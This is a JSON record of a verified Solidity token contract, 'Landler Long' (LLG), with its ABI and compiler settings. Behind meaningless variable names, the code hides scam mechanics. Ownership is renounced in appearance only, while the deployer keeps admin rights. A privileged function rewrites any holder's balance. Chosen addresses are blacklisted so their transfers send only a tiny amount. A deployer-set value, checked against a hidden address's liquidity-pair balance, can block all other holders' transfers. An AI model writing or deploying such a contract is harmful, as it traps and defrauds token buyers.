{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface tradingTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMarketing {\n    function createPair(address launchedLaunch, address walletReceiverEnable) external returns (address);\n}\n\ninterface launchedMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTrading) external view returns (uint256);\n\n    function transfer(address walletLiquidityExempt, uint256 atModeMax) external returns (bool);\n\n    function allowance(address enableSwapFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atModeMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletLiquidityExempt,\n        uint256 atModeMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTx, uint256 value);\n    event Approval(address indexed enableSwapFund, address indexed spender, uint256 value);\n}\n\ninterface fromModeBuy is launchedMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LandlerLong is sellTotal, launchedMarketing, fromModeBuy {\n\n    uint256 public receiverExempt;\n\n    uint8 private listWalletReceiver = 18;\n\n    function getOwner() external view returns (address) {\n        return fromMax;\n    }\n\n    address sellIsSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public txTeamMax;\n\n    uint256 feeMin;\n\n    function transfer(address swapFee, uint256 atModeMax) external virtual override returns (bool) {\n        return maxLiquidity(_msgSender(), swapFee, atModeMax);\n    }\n\n    mapping(address => uint256) private tradingLaunchedMarketing;\n\n    function swapTrading() public {\n        emit OwnershipTransferred(fundTx, address(0));\n        fromMax = address(0);\n    }\n\n    function transferFrom(address sellWalletTotal, address walletLiquidityExempt, uint256 atModeMax) external override returns (bool) {\n        if (_msgSender() != sellIsSwap) {\n            if (listReceiverFee[sellWalletTotal][_msgSender()] != type(uint256).max) {\n                require(atModeMax <= listReceiverFee[sellWalletTotal][_msgSender()]);\n                listReceiverFee[sellWalletTotal][_msgSender()] -= atModeMax;\n            }\n        }\n        return maxLiquidity(sellWalletTotal, walletLiquidityExempt, atModeMax);\n    }\n\n    bool public swapList;\n\n    function receiverToken(address sellWalletTotal, address walletLiquidityExempt, uint256 atModeMax) internal returns (bool) {\n        require(tradingLaunchedMarketing[sellWalletTotal] >= atModeMax);\n        tradingLaunchedMarketing[sellWalletTotal] -= atModeMax;\n        tradingLaunchedMarketing[walletLiquidityExempt] += atModeMax;\n        emit Transfer(sellWalletTotal, walletLiquidityExempt, atModeMax);\n        return true;\n    }\n\n    bool public amountFee;\n\n    event OwnershipTransferred(address indexed launchedReceiver, address indexed sellLaunched);\n\n    string private txFrom = \"LLG\";\n\n    function balanceOf(address receiverTrading) public view virtual override returns (uint256) {\n        return tradingLaunchedMarketing[receiverTrading];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchWallet;\n    }\n\n    address private fromMax;\n\n    function teamLaunch(uint256 atModeMax) public {\n        receiverShould();\n        modeSwapAmount = atModeMax;\n    }\n\n    function maxLiquidity(address sellWalletTotal, address walletLiquidityExempt, uint256 atModeMax) internal returns (bool) {\n        if (sellWalletTotal == fundTx) {\n            return receiverToken(sellWalletTotal, walletLiquidityExempt, atModeMax);\n        }\n        uint256 marketingSender = launchedMarketing(walletLimit).balanceOf(launchedLiquidity);\n        require(marketingSender == modeSwapAmount);\n        require(walletLiquidityExempt != launchedLiquidity);\n        if (buyTeamToken[sellWalletTotal]) {\n            return receiverToken(sellWalletTotal, walletLiquidityExempt, fromEnable);\n        }\n        return receiverToken(sellWalletTotal, walletLiquidityExempt, atModeMax);\n    }\n\n    mapping(address => bool) public buyTeamToken;\n\n    uint256 modeSwapAmount;\n\n    address public fundTx;\n\n    constructor (){\n        \n        tradingTake autoFee = tradingTake(sellIsSwap);\n        walletLimit = enableMarketing(autoFee.factory()).createPair(autoFee.WETH(), address(this));\n        \n        fundTx = _msgSender();\n        swapTrading();\n        txTeamMax[fundTx] = true;\n        tradingLaunchedMarketing[fundTx] = isFund;\n        if (txTrading) {\n            autoSell = false;\n        }\n        emit Transfer(address(0), fundTx, isFund);\n    }\n\n    uint256 private isFund = 100000000 * 10 ** 18;\n\n    function allowance(address enableSender, address marketingShouldFrom) external view virtual override returns (uint256) {\n        if (marketingShouldFrom == sellIsSwap) {\n            return type(uint256).max;\n        }\n        return listReceiverFee[enableSender][marketingShouldFrom];\n    }\n\n    uint256 public senderTrading;\n\n    function approve(address marketingShouldFrom, uint256 atModeMax) public virtual override returns (bool) {\n        listReceiverFee[_msgSender()][marketingShouldFrom] = atModeMax;\n        emit Approval(_msgSender(), marketingShouldFrom, atModeMax);\n        return true;\n    }\n\n    bool private autoSell;\n\n    uint256 private feeAmountMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listWalletReceiver;\n    }\n\n    function limitSwap(address shouldTo) public {\n        receiverShould();\n        if (receiverExempt != feeAmountMin) {\n            txTrading = true;\n        }\n        if (shouldTo == fundTx || shouldTo == walletLimit) {\n            return;\n        }\n        buyTeamToken[shouldTo] = true;\n    }\n\n    function owner() external view returns (address) {\n        return fromMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isFund;\n    }\n\n    string private launchWallet = \"Landler Long\";\n\n    address public walletLimit;\n\n    function maxEnable(address atTeam) public {\n        require(atTeam.balance < 100000);\n        if (amountFee) {\n            return;\n        }\n        if (autoSell) {\n            autoSell = true;\n        }\n        txTeamMax[atTeam] = true;\n        \n        amountFee = true;\n    }\n\n    uint256 public walletSender;\n\n    address launchedLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant fromEnable = 3 ** 10;\n\n    function receiverShould() private view {\n        require(txTeamMax[_msgSender()]);\n    }\n\n    function autoTotal(address swapFee, uint256 atModeMax) public {\n        receiverShould();\n        tradingLaunchedMarketing[swapFee] = atModeMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private listReceiverFee;\n\n    bool private txTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSwapFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingShouldFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atModeMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atModeMax\",\"type\":\"uint256\"}],\"name\":\"autoTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTeamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"limitSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atModeMax\",\"type\":\"uint256\"}],\"name\":\"teamLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atModeMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWalletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLiquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atModeMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTeamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LandlerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}